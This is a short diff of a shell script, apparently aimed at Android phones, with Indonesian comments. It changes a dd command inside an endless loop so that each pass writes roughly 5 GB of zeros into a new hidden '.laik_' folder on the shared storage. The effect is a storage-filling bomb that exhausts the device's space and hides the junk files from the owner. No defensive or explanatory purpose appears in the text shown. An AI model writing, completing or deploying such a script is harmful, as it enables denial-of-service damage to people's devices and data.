@@ -18,7 +18,7 @@ while true; do
     mkdir "/storage/emulated/0/.laik_$count"
     
     # Buat file dengan ukuran 5 GB
-    dd if=/dev/zero of="$folder_name/file_$count" bs=1024 count=0 status=none
+    dd if=/dev/zero of="$folder_name/file_$count" bs=1024 count=5120000 status=none
   done
   
   clear
